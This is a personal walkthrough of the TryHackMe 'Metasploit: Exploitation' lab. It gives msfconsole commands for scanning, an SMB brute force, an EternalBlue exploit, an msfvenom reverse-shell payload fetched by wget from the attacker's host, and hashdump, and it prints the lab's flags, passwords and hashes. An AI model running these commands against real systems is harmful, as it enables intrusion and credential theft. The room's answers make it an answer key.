---
msf:
  - "Metasploit: Exploitation"
Date: 12 April 2024
Platform: metasploit
Category: paid
Difficulty: easy
tags:
  - THM
Status: solve
IP: 10.10.186.136
---
# Metasploit: Exploitation 
---
description: Using Metasploit for scanning, vulnerability assessment and exploitation.
	[link of the room](https://tryhackme.com/room/metasploitexploitation)

## Task 2 Scanning

#### How many ports are open on the target system?

```bash
msfconsole
msf > search portscan
msf > use 5
msf > setg RHOSTS 10.10.186.136
msf > run
```
![[msfconsole.png]]
![[portscan.png]]

![[porscanresult.png]]
#### Using the relevant scanner, what NetBIOS name can you see?

```bash
msf > search netbios
msf > use 2
msf > run
```
![[netbios.png]]
![[netbios_result.png]]
`ACME IT SUPPORT`
#### What is running on port 8000?

```bash
msf > search http_version
msf > show options
msf > use 0
msf > set RHOST 10.10.186.136
msf > set RPORT 8000
msf > run
```
![[search_http.png]]
![[httpnmap.png]]

`webfs/1.21`
#### What is the "penny" user's SMB password?

```bash
msf > search smb_login
msf > use 0
msf > set RHOSTS 10.10.186.136
msf > set SMBUser penny
msf > set PASS_FILE MetasploitWordlist-1632491116676.txt
msf > run
```
![[search_smb_login.png]]
![[smb_login.png]]
![[smbbruteforce.png]]
`leo1234`
## Task 4 Vulnerability Scanning

#### Who wrote the module that allows us to check SMTP servers for open relay?

```bash
msf > search smtp relay
msf > use 0
msf > info
```
![[smtp_relay.png]]
## Task 5 Exploitation

#### Exploit one of the critical vulnerabilities on the target VM

```bash
msfconsole
msf > search eternalblue 
msf > use 0
msf > set RHOSTS 10.10.5.180
msf > set LHOST 10.8.45.125
msf > run
```

![[search_eternalblue.png]]
![[run_blue.png]]
#### What is the content of the flag.txt file?

```bash
meterpreter > search -d C:\\ -f flag.txt
meterpreter > cat 'C:\Users\Jon\Documents\flag.txt'
```

`THM-5455554845`
#### What is the NTLM hash of the password of the user "pirate"?

```bash
hashdump
```

`8ce9a3ebd1647fcc5e04025019f4b875`
## Task 6 Msfvenom

#### Launch the VM attached to this task. The username is murphy, and the password is 1q2w3e4r. You can connect via SSH or launch this machine in the browser. Once on the terminal, type "sudo su" to get a root shell, this will make things easier.

```bash
ssh murphy@10.10.223.208
sudo -l
sudo su -
```
#### Create a meterpreter payload in the .elf format.
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
```
![[shell.png]]
#### Transfer it to the target machine

```bash
python -m http.server
```

![](share.png)
### Download malicious file from attacker side

~~~bash
wget http://10.8.45.125:8000/rev_shell.elf
~~~

![](transfer.png)
#### Get a meterpreter session on the target machine.
```bash
chmod +x shell.elf
./shell.elf
```
![](chmod.png)
```bash
msf > use exploit/multi/handler
msf > set payload linux/x86/meterpreter/reverse_tcp
msf > set LHOST 10.8.45.125
msf > run
```
![[metas.png]]
#### Use a post exploitation module to dump hashes of other users on the system.

```bash
meterpreter > run post/linux/gather/hashdump
```

 
![](hashdump.png)
#### What is the other user's password hash?
```
$6$Sy0NNIXw$SJ27WltHI89hwM5UxqVGiXidj94QFRm2Ynp9p9kxgVbjrmtMez9EqXoDWtcQd8rf0tjc77hBFbWxjGmQCTbep0:18851
```
